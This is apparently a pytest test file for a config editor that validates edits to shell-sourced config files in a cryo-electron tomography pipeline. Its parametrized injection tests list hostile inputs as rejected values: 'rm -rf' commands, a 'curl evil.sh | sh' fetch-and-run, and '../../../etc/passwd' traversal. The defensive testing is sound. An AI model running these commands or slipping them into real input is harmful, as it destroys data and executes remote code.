import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))
import config_edit as ce

CONF = (
    '# species config\n'
    'TM_LABEL="ribo"\n'
    'OUTPUT_ANGPIX="4.2"                     # exported subtomogram pixel size\n'
    'SUBTOMO_BOX_SIZE=104                     # box at OUTPUT_ANGPIX\n'
    'ZDIM=8\n'
)


@pytest.mark.parametrize("evil", [
    "$(rm -rf ~)",
    "`whoami`",
    "4.2; rm -rf /",
    "4.2\nMALICIOUS=1",
    "4.2 && curl evil.sh | sh",
    "${IFS}cat",
    "4.2|tee /etc/passwd",
])
def test_injection_attempts_are_rejected(evil):
    """Values are parsed into a declared type; shell metacharacters cannot
    survive that, so nothing arbitrary can reach a file that gets sourced."""
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["OUTPUT_ANGPIX"], evil)


def test_unknown_key_is_refused():
    with pytest.raises(ce.ValidationError):
        ce.apply_edit(CONF, "WARP_DIR", "/anything")


def test_key_absent_from_file_is_refused_not_invented():
    with pytest.raises(ce.ValidationError):
        ce.apply_edit('ZDIM=8\n', "NUM_EPOCHS", "40")


def test_valid_edit_replaces_only_that_line_and_keeps_comment():
    out = ce.apply_edit(CONF, "OUTPUT_ANGPIX", "5.0")
    lines = out.splitlines()
    assert lines[2] == 'OUTPUT_ANGPIX="5.0"                     # exported subtomogram pixel size'
    # every other line untouched
    assert lines[0] == '# species config'
    assert lines[1] == 'TM_LABEL="ribo"'
    assert lines[4] == 'ZDIM=8'


def test_int_key_rejects_float_and_accepts_int():
    assert ce.coerce(ce.ALLOWLIST["ZDIM"], "16") == 16
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["ZDIM"], "16.5")


def test_range_is_enforced():
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["ZDIM"], "0")
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["ZDIM"], "999")


def test_even_constraint_enforced():
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["SUBTOMO_BOX_SIZE"], "105")
    assert ce.coerce(ce.ALLOWLIST["SUBTOMO_BOX_SIZE"], "104") == 104


def test_enum_key_rejects_other_values():
    assert ce.coerce(ce.ALLOWLIST["TEMPLATE_INVERT"], "1") == "1"
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["TEMPLATE_INVERT"], "2")


def test_minimum_is_exclusive_only_where_the_spec_says_so():
    """config_keys.md documents MASK_SIGMA as >= 0 but LEARNING_RATE as
    0 < x < 1, so a blanket exclusive minimum would wrongly reject
    MASK_SIGMA=0."""
    assert ce.coerce(ce.ALLOWLIST["MASK_SIGMA"], "0") == 0.0
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["LEARNING_RATE"], "0")


def test_output_angpix_must_not_be_finer_than_raw_angpix():
    """A real failure already hit on this project: an OUTPUT_ANGPIX finer than
    the raw ANGPIX is invalid upsampling."""
    with pytest.raises(ce.ValidationError):
        ce.cross_key_check("OUTPUT_ANGPIX", 2.5, {"ANGPIX": "3.37"})
    ce.cross_key_check("OUTPUT_ANGPIX", 4.2, {"ANGPIX": "3.37"})  # no raise


class FakeClient:
    def __init__(self, files, validate_rc=0, validate_out="", listing=None):
        self.files = dict(files)
        self.validate_rc = validate_rc
        self.validate_out = validate_out
        self.listing = ("/run/species.conf\n/run/species_fas.conf\n"
                        if listing is None else listing)
        self.runs = []

    def read_file(self, path):
        return self.files[path]

    def write_file(self, path, content):
        self.files[path] = content

    def run(self, argv, **kw):
        self.runs.append(argv)
        import cluster
        if any("ls -1" in str(a) for a in argv):
            return cluster.Result(self.listing, "", 0)
        if argv[:1] == ["rm"]:
            for a in argv:
                self.files.pop(a, None)
            return cluster.Result("", "", 0)
        return cluster.Result(self.validate_out, "", self.validate_rc)


def _editor(client):
    return ce.ConfigEditor(
        client,
        species_conf_path="/run/species.conf",
        pipeline_conf_path="/run/pipeline.conf",
        validate_cmd=["bash", "/run/validate.sh", "--json"],
    )


def test_apply_writes_backup_before_editing():
    c = FakeClient({"/run/species.conf": CONF, "/run/pipeline.conf": 'ANGPIX="3.37"\n'})
    backup = _editor(c).apply("ZDIM", "16")
    assert backup.startswith("/run/species.conf.bak.")
    assert c.files[backup] == CONF                      # original preserved
    assert 'ZDIM=16' in c.files["/run/species.conf"]     # new value applied


def test_apply_rolls_back_when_validate_fails():
    c = FakeClient(
        {"/run/species.conf": CONF, "/run/pipeline.conf": 'ANGPIX="3.37"\n'},
        validate_rc=1,
        validate_out="box smaller than particle",
    )
    with pytest.raises(ce.ValidationError) as exc:
        _editor(c).apply("ZDIM", "16")
    assert "box smaller than particle" in str(exc.value)
    assert c.files["/run/species.conf"] == CONF          # restored


def test_current_values_returns_only_allowlisted_keys_present_in_file():
    c = FakeClient({"/run/species.conf": CONF, "/run/pipeline.conf": 'ANGPIX="3.37"\n'})
    vals = _editor(c).current_values()
    assert vals["OUTPUT_ANGPIX"] == "4.2"
    assert vals["ZDIM"] == "8"
    assert vals["SUBTOMO_BOX_SIZE"] == "104"
    # TM_LABEL is in the file but is NOT editable, so it must not be offered.
    assert "TM_LABEL" not in vals
    # NUM_EPOCHS is editable but absent from this file.
    assert "NUM_EPOCHS" not in vals


PIPE = (
    '# pipeline config\n'
    'ANGPIX="3.37"\n'
    'EXPOSURE="2.36"\n'
    'BINNING_FACTOR=4                         # tilt-series binning\n'
    'CTF_GRID="2x2x1"\n'
    'CTF_WINDOW=512\n'
    'MIN_INTENSITY=0.3\n'
)


def _two_file_client():
    return FakeClient({"/run/species.conf": CONF, "/run/pipeline.conf": PIPE})


def test_grid_type_accepts_dimensions_and_rejects_everything_else():
    assert ce.coerce(ce.ALLOWLIST["CTF_GRID"], "2x2x1") == "2x2x1"
    for bad in ["2x2", "2x2x1; rm -rf /", "$(id)x1x1", "2 x 2 x 1", "", "1x1x1x1"]:
        with pytest.raises(ce.ValidationError):
            ce.coerce(ce.ALLOWLIST["CTF_GRID"], bad)


def test_pipeline_key_writes_to_pipeline_conf_and_leaves_species_untouched():
    c = _two_file_client()
    backup = _editor(c).apply("BINNING_FACTOR", "8")
    assert backup.startswith("/run/pipeline.conf.bak.")
    assert "BINNING_FACTOR=8" in c.files["/run/pipeline.conf"]
    assert c.files["/run/species.conf"] == CONF          # untouched


def test_species_key_still_writes_to_species_conf():
    c = _two_file_client()
    backup = _editor(c).apply("ZDIM", "16")
    assert backup.startswith("/run/species.conf.bak.")
    assert c.files["/run/pipeline.conf"] == PIPE         # untouched


def test_binning_factor_carries_a_loud_warning():
    """It is load-bearing: ALIGN_ANGPIX derives from it and every existing
    tomogram was reconstructed at that binning."""
    assert "ALIGN_ANGPIX" in ce.ALLOWLIST["BINNING_FACTOR"].warning


def test_acquisition_facts_are_not_editable():
    """ANGPIX/EXPOSURE describe the data; changing them invalidates outputs
    rather than reconfiguring anything."""
    assert "ANGPIX" not in ce.ALLOWLIST
    assert "EXPOSURE" not in ce.ALLOWLIST
    assert "WORK_DIR" not in ce.ALLOWLIST


def test_current_values_spans_both_conf_files():
    vals = _editor(_two_file_client()).current_values()
    assert vals["ZDIM"] == "8"                  # species conf
    assert vals["BINNING_FACTOR"] == "4"        # pipeline conf
    assert vals["CTF_GRID"] == "2x2x1"
    assert "ANGPIX" not in vals                 # read-only, never editable


def test_dataset_values_expose_read_only_acquisition_facts():
    ds = _editor(_two_file_client()).dataset_values()
    assert ds["ANGPIX"] == "3.37"
    assert ds["EXPOSURE"] == "2.36"


def test_available_species_lists_the_conf_files_beside_the_active_one():
    c = _two_file_client()
    assert _editor(c).available_species() == ["species.conf", "species_fas.conf"]


def test_switching_species_reads_that_file_not_the_default():
    c = _two_file_client()
    c.files["/run/species_fas.conf"] = 'ZDIM=24\nOUTPUT_ANGPIX="6.0"\n'
    vals = _editor(c).current_values(species="species_fas.conf")
    assert vals["ZDIM"] == "24"
    assert vals["OUTPUT_ANGPIX"] == "6.0"


def test_editing_under_a_switched_species_writes_that_file():
    c = _two_file_client()
    c.files["/run/species_fas.conf"] = 'ZDIM=24\n'
    backup = _editor(c).apply("ZDIM", "12", species="species_fas.conf")
    assert backup.startswith("/run/species_fas.conf.bak.")
    assert "ZDIM=12" in c.files["/run/species_fas.conf"]
    assert c.files["/run/species.conf"] == CONF          # untouched


@pytest.mark.parametrize("evil", [
    "../../../etc/passwd", "/etc/passwd", "species.conf; rm -rf /",
    "$(id).conf", "nope.conf", "",
])
def test_unknown_species_is_refused_so_no_path_is_built_from_client_input(evil):
    c = _two_file_client()
    with pytest.raises(ce.ValidationError):
        _editor(c).current_values(species=evil)


def test_create_species_writes_a_new_conf_from_the_active_template():
    c = _two_file_client()
    name = _editor(c).create_species("26s", {"ZDIM": "16"})
    assert name == "species_26s.conf"
    new = c.files["/run/species_26s.conf"]
    assert "ZDIM=16" in new
    assert 'TM_LABEL="ribo"' in new              # inherited from the template
    assert c.files["/run/species.conf"] == CONF  # template untouched


@pytest.mark.parametrize("bad", [
    "../../etc/passwd", "a/b", "has space", "semi;colon", "$(id)", "", "-" * 40,
])
def test_create_species_refuses_a_name_that_is_not_a_plain_slug(bad):
    c = _two_file_client()
    with pytest.raises(ce.ValidationError):
        _editor(c).create_species(bad)
    assert sorted(c.files) == ["/run/pipeline.conf", "/run/species.conf"]


def test_create_species_refuses_to_overwrite_an_existing_conf():
    c = _two_file_client()
    with pytest.raises(ce.ValidationError):
        _editor(c).create_species("fas")          # species_fas.conf already listed


def test_create_species_validates_every_value_before_writing_anything():
    c = _two_file_client()
    with pytest.raises(ce.ValidationError):
        _editor(c).create_species("bad", {"ZDIM": "$(rm -rf ~)"})
    assert "/run/species_bad.conf" not in c.files


def test_create_species_removes_the_file_when_validate_rejects_it():
    """A create has no prior version to restore, so rollback means deleting
    the file we just made."""
    c = FakeClient({"/run/species.conf": CONF, "/run/pipeline.conf": PIPE},
                   validate_rc=1, validate_out="box smaller than particle")
    with pytest.raises(ce.ValidationError) as exc:
        _editor(c).create_species("26s", {"ZDIM": "16"})
    assert "box smaller than particle" in str(exc.value)
    assert "/run/species_26s.conf" not in c.files


def test_available_species_excludes_the_shipped_example_template():
    """species.example.conf matches species*.conf but is the skill's template,
    not a run species."""
    c = FakeClient({"/run/species.conf": CONF, "/run/pipeline.conf": PIPE},
                   listing="/run/species.conf\n/run/species.example.conf\n"
                           "/run/species_fas.conf\n")
    assert _editor(c).available_species() == ["species.conf", "species_fas.conf"]


def test_template_matching_parameters_are_editable():
    for k in ("DIAMETER", "TM_BOX_SIZE", "MASK_RADIUS", "EXTRACT_MASK_RADIUS",
              "TEMPLATE_MIRROR", "TM_SPLIT_X", "TM_SPLIT_Y", "TM_SPLIT_Z"):
        assert k in ce.ALLOWLIST, f"{k} should be editable"
        assert ce.ALLOWLIST[k].file == "species"


def test_every_key_declares_a_pipeline_stage():
    for k, spec in ce.ALLOWLIST.items():
        assert spec.stage, f"{k} has no stage"


def test_mask_radius_must_fit_inside_the_template_box():
    """SKILL rule: MASK_RADIUS + MASK_SIGMA < TM_BOX_SIZE / 2, so the soft
    edge fits inside the template box."""
    species = {"TM_BOX_SIZE": "32", "MASK_SIGMA": "1"}
    ce.cross_key_check("MASK_RADIUS", 11, {}, species)          # 11+1 < 16, fine
    with pytest.raises(ce.ValidationError):
        ce.cross_key_check("MASK_RADIUS", 15, {}, species)      # 15+1 == 16, too big


def test_diameter_warns_that_box_sizes_derive_from_it():
    assert "BOX_SIZE" in ce.ALLOWLIST["DIAMETER"].warning


def test_extract_mask_radius_warns_it_should_exceed_the_sphere_mask():
    assert "MASK_RADIUS" in ce.ALLOWLIST["EXTRACT_MASK_RADIUS"].warning


def test_paths_and_namespace_keys_stay_out_of_the_allowlist():
    for k in ("INPUT_MRC", "ANGLE_LIST", "DATADIR", "TEMPLATE_MRC", "TM_MASK_MRC",
              "M_PARTICLES_STAR", "TM_LABEL", "OUTPUT_DIR", "MAP_ANGPIX"):
        assert k not in ce.ALLOWLIST, f"{k} must not be editable"


def test_box_sizes_enforce_even_and_only_advise_multiple_of_eight():
    """The sizing rule is round_to_even(...); 'multiple of 8 (preferably 16)'
    is a SHOULD for FFT efficiency. Enforcing the preference as a hard rule
    would reject a legitimate box like 44."""
    assert ce.coerce(ce.ALLOWLIST["SUBTOMO_BOX_SIZE"], "104") == 104
    assert ce.coerce(ce.ALLOWLIST["TM_BOX_SIZE"], "44") == 44      # even, not /8
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["TM_BOX_SIZE"], "33")               # odd
    assert "multiple of 8" in ce.ALLOWLIST["TM_BOX_SIZE"].warning


def test_nms_radius_must_exceed_the_sphere_mask_radius():
    """SKILL item 14: intentionally larger than MASK_RADIUS."""
    ce.cross_key_check("EXTRACT_MASK_RADIUS", 14, {}, {"MASK_RADIUS": "11"})
    with pytest.raises(ce.ValidationError):
        ce.cross_key_check("EXTRACT_MASK_RADIUS", 9, {}, {"MASK_RADIUS": "11"})


def test_templateres_has_no_invented_evenness_rule():
    """Nothing documents an evenness constraint; inventing one would reject
    legitimate values."""
    assert ce.coerce(ce.ALLOWLIST["TEMPLATERES"], "127") == 127


def test_min_score_accepts_a_negative_cross_correlation():
    assert ce.coerce(ce.ALLOWLIST["MIN_SCORE"], "-0.2") == -0.2


def test_diameter_is_a_float_but_keeps_integer_spelling():
    """Angstrom diameters can be fractional, yet 320 must not become 320.0 --
    scripts do shell arithmetic on it."""
    assert ce.coerce(ce.ALLOWLIST["DIAMETER"], "155.5") == 155.5
    out = ce.apply_edit('DIAMETER=320                # particle diameter in A\n',
                        "DIAMETER", "400")
    assert "DIAMETER=400 " in out and "400.0" not in out


def test_decimal_fields_keep_their_decimal_spelling():
    out = ce.apply_edit('OUTPUT_ANGPIX="4.2"\n', "OUTPUT_ANGPIX", "5")
    assert 'OUTPUT_ANGPIX="5.0"' in out


# Values taken verbatim from a real run's species.conf and pipeline.conf.
# Numbers and enums only -- no paths, so nothing environment-specific is
# committed. The allowlist must accept what real runs actually use; several
# constraints here were originally invented (even-only box sizes, an
# evenness rule on TEMPLATERES, a non-negative MIN_SCORE) and were wrong.
LIVE_VALUES = [
    ("BATCH_SIZE", "12"),
    ("BETA_CONTROL", "0.5"),
    ("BFACTOR", "3.75"),
    ("BINNING_FACTOR", "4"),
    ("CTF_DEFOCUS_MAX", "8"),
    ("CTF_GRID", "2x2x1"),
    ("CTF_RANGE_MAX", "7"),
    ("CTF_WINDOW", "512"),
    ("DEFAULT_Z_START", "20"),
    ("DIAMETER", "320"),
    ("DOWNSAMPLE_FRAC", "1."),
    ("EXTRACT_MASK_RADIUS", "14"),
    ("LAMB", "0.5"),
    ("LEARNING_RATE", "4e-5"),
    ("MASK_RADIUS", "11"),
    ("MASK_RADIUS_FRACTION", "0.85"),
    ("MASK_SIGMA", "1"),
    ("MASK_SOFT_EDGE", "2"),
    ("MIN_INTENSITY", "0.3"),
    ("MIN_SCORE", "0.0"),
    ("MOTION_GRID", "1x1x3"),
    ("NUM_CANDIDATES", "5000"),
    ("NUM_EPOCHS", "40"),
    ("OUTPUT_ANGPIX", "4.2"),
    ("SUBTOMO_BOX_SIZE", "104"),
    ("TEMPLATERES", "128"),
    ("TEMPLATE_INVERT", "0"),
    ("TEMPLATE_MIRROR", "0"),
    ("TM_BOX_SIZE", "32"),
    ("TM_SPLIT_X", "2"),
    ("TM_SPLIT_Y", "2"),
    ("TM_SPLIT_Z", "1"),
    ("VAL_FRAC", "0.1"),
    ("ZAFFINEDIM", "6"),
    ("ZDIM", "8"),
]


@pytest.mark.parametrize("key,raw", LIVE_VALUES)
def test_allowlist_accepts_values_from_a_real_run(key, raw):
    ce.coerce(ce.ALLOWLIST[key], raw)


@pytest.mark.parametrize("key,value", [
    ("LEARNING_RATE", "0.5"),    # would never converge
    ("LEARNING_RATE", "1.0"),
    ("VAL_FRAC", "1.0"),         # holds out everything, leaving no training data
    ("NUM_EPOCHS", "500"),       # far past the useful 20-80 range
    ("NUM_EPOCHS", "5"),         # too few to converge
    ("BETA_CONTROL", "8"),       # should not exceed 4
    ("LAMB", "5"),               # should stay under 2
    ("ZDIM", "32"),              # should stay under 16
])
def test_training_ranges_reject_values_that_would_waste_a_run(key, value):
    """These all passed originally. A wrong learning rate does not error --
    it silently burns days of GPU and returns a useless model, so the range
    has to be the guard."""
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST[key], value)


def test_learning_rate_warns_about_silent_failure():
    w = ce.ALLOWLIST["LEARNING_RATE"].warning
    assert "converge" in w and "silently" in w


def test_batch_size_is_warned_about_rather_than_capped():
    """It is bounded by GPU memory, which depends on box size and card -- a
    fixed ceiling would be a fiction. The guard is the warning."""
    assert ce.coerce(ce.ALLOWLIST["BATCH_SIZE"], "128") == 128
    assert "memory" in ce.ALLOWLIST["BATCH_SIZE"].warning.lower()


def test_learning_rate_is_held_to_the_1e_5_range():
    assert ce.coerce(ce.ALLOWLIST["LEARNING_RATE"], "4e-5") == 4e-5
    for bad in ("0.01", "0.5", "1e-8"):
        with pytest.raises(ce.ValidationError):
            ce.coerce(ce.ALLOWLIST["LEARNING_RATE"], bad)


def test_zaffinedim_shares_zdim_bounds():
    """They are bound to the same constants so a later edit cannot separate
    them."""
    z, za = ce.ALLOWLIST["ZDIM"], ce.ALLOWLIST["ZAFFINEDIM"]
    assert (z.minimum, z.maximum) == (za.minimum, za.maximum)
    assert ce.coerce(za, "6") == 6
    with pytest.raises(ce.ValidationError):
        ce.coerce(za, "32")


def test_bfactor_stays_under_ten():
    assert ce.coerce(ce.ALLOWLIST["BFACTOR"], "3.75") == 3.75
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["BFACTOR"], "15")


@pytest.mark.parametrize("key,value", [
    ("DIAMETER", "10000"),        # 1 um is not a particle
    ("TM_BOX_SIZE", "512"),       # TM runs binned; boxes are tens of px
    ("MASK_RADIUS", "200"),       # cannot satisfy MASK_RADIUS+SIGMA < BOX/2
    ("EXTRACT_MASK_RADIUS", "200"),
    ("TM_SPLIT_X", "16"),
    ("DEFAULT_Z_START", "9999"),  # outside any tomogram
])
def test_template_matching_ceilings_reject_implausible_values(key, value):
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST[key], value)


@pytest.mark.parametrize("key,value", [
    ("DIAMETER", "320"), ("DIAMETER", "1200"),   # ribosome, nuclear pore
    ("TM_BOX_SIZE", "32"), ("TM_BOX_SIZE", "256"),
    ("MASK_RADIUS", "11"), ("EXTRACT_MASK_RADIUS", "14"),
    ("TM_SPLIT_X", "2"), ("TM_SPLIT_Z", "1"), ("DEFAULT_Z_START", "20"),
])
def test_template_matching_ceilings_still_admit_real_work(key, value):
    ce.coerce(ce.ALLOWLIST[key], value)


def test_z_start_is_bounded_by_the_tomogram_depth_not_a_fixed_number():
    """TM runs on the binned reconstruction, so the usable Z range is
    TOMO_DIM_Z / BINNING_FACTOR -- 500 slices here, not a static ceiling."""
    pipe = {"TOMO_DIM_Z": "2000", "BINNING_FACTOR": "4"}     # -> 500 slices
    ce.cross_key_check("DEFAULT_Z_START", 20, pipe, {})
    ce.cross_key_check("DEFAULT_Z_START", 499, pipe, {})
    with pytest.raises(ce.ValidationError) as exc:
        ce.cross_key_check("DEFAULT_Z_START", 600, pipe, {})
    assert "500" in str(exc.value)


def test_z_start_check_is_skipped_when_the_depth_is_unknown():
    """A blank TOMO_DIM_Z must not make every value unverifiable-and-refused."""
    ce.cross_key_check("DEFAULT_Z_START", 900, {"TOMO_DIM_Z": "", "BINNING_FACTOR": "4"}, {})
    ce.cross_key_check("DEFAULT_Z_START", 900, {}, {})


PIPE_REAL = {"ANGPIX": "3.37", "BINNING_FACTOR": "4"}          # ALIGN_ANGPIX 13.48
SPEC_REAL = {"DIAMETER": "320", "OUTPUT_ANGPIX": "4.2",
             "TM_BOX_SIZE": "32", "SUBTOMO_BOX_SIZE": "104"}


def test_real_box_sizes_satisfy_the_coverage_rule():
    ce.cross_key_check("TM_BOX_SIZE", 32, PIPE_REAL, SPEC_REAL)
    ce.cross_key_check("SUBTOMO_BOX_SIZE", 104, PIPE_REAL, SPEC_REAL)


def test_a_box_too_small_for_the_particle_is_refused():
    """validate.sh enforces the same rule: the box must span the particle."""
    with pytest.raises(ce.ValidationError) as exc:
        ce.cross_key_check("TM_BOX_SIZE", 16, PIPE_REAL, SPEC_REAL)   # 216 A < 320 A
    assert "smaller than the 320 A particle" in str(exc.value)
    assert "~32 px" in str(exc.value)          # reports the recommended size


def test_an_oversized_box_is_allowed():
    """Only under-coverage is a hard error; the 75%-occupancy target is a
    recommendation, and high-res cases legitimately use a larger box."""
    ce.cross_key_check("SUBTOMO_BOX_SIZE", 160, PIPE_REAL, SPEC_REAL)


def test_raising_the_diameter_catches_boxes_left_behind():
    """The DIAMETER warning says the boxes are derived from it; this makes
    that enforceable rather than advisory."""
    with pytest.raises(ce.ValidationError) as exc:
        ce.cross_key_check("DIAMETER", 600, PIPE_REAL, SPEC_REAL)
    assert "TM_BOX_SIZE" in str(exc.value)
    ce.cross_key_check("DIAMETER", 400, PIPE_REAL, SPEC_REAL)   # still covered


def test_box_checks_are_skipped_when_inputs_are_unknown():
    ce.cross_key_check("TM_BOX_SIZE", 32, {}, {})
    ce.cross_key_check("SUBTOMO_BOX_SIZE", 104, PIPE_REAL, {"DIAMETER": "320"})


def test_recommend_reports_the_sizing_rule_not_just_a_range():
    """'32 to 1024' tells you nothing about what to type; the derived value
    does."""
    pipe = {"ANGPIX": "3.37", "BINNING_FACTOR": "4", "TOMO_DIM_Z": "2000"}
    spec = {"DIAMETER": "320", "OUTPUT_ANGPIX": "4.2", "TM_BOX_SIZE": "32",
            "MASK_RADIUS": "11", "MASK_SIGMA": "1"}
    assert "~102" in ce.recommend("SUBTOMO_BOX_SIZE", pipe, spec)
    assert "~32" in ce.recommend("TM_BOX_SIZE", pipe, spec)
    assert "3.37" in ce.recommend("OUTPUT_ANGPIX", pipe, spec)
    assert "500" in ce.recommend("DEFAULT_Z_START", pipe, spec)


def test_recommend_returns_nothing_when_inputs_are_missing():
    assert ce.recommend("SUBTOMO_BOX_SIZE", {}, {}) is None
    assert ce.recommend("ZDIM", {}, {}) is None


def test_pixel_size_and_box_ceilings_are_physical():
    """A 1000 A 'pixel size' and a 1024 box for a 320 A particle were both
    nonsense."""
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["OUTPUT_ANGPIX"], "1000")
    with pytest.raises(ce.ValidationError):
        ce.coerce(ce.ALLOWLIST["SUBTOMO_BOX_SIZE"], "1024")
    assert ce.coerce(ce.ALLOWLIST["OUTPUT_ANGPIX"], "4.2") == 4.2
    assert ce.coerce(ce.ALLOWLIST["SUBTOMO_BOX_SIZE"], "104") == 104
